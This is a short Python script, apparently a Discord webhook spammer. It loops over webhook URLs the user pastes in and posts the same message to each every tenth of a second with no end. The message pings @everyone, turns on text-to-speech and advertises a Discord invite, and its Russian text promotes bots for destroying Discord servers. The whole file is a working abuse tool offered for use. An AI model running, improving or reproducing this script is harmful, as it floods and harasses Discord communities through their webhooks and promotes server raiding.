import os
import time
try: 
    import requests
except:
    os.system('pip install requests')

def send(urls):
    data={
        "username": "ムムムム",
        "avatar_url": "https://cdn.discordapp.com/icons/861735850211409930/6997ac04b6faa2e2db11c686ad4be2dd.webp?size=256",
        "content": "ム @everyone https://discord.gg/QQbN3M7Wck @everyone ム",
        "tts": "true",
        "embeds": [
            {
                "color": 14566400,
                "description": "ムムム [Мощные боты для уничтожения серверов Discord](https://discord.gg/QQbN3M7Wck) ムムム",
                "image": {"url": "https://cdn.discordapp.com/attachments/973699316273283152/991979790024319027/standard.gif"}
            }
        ]
    }
    while True:
        time.sleep(0.1)
        for url in urls:
            result=requests.post(url, json=data)
            try: 
                result.raise_for_status()
            except requests.exceptions.HTTPError as err: 
                print(err)
            else:
                print("payload delivered successfully, code {}.".format(result.status_code))

def main():
    urls=[]
    while True:
        action=input("paste webhook url or press ENTER>")
        if "https://discord.com/api/webhooks/" in action:
            if not action in str(urls):
                urls.append(action)
        elif action == "":
            send(urls)

if __name__ == "__main__":
    main()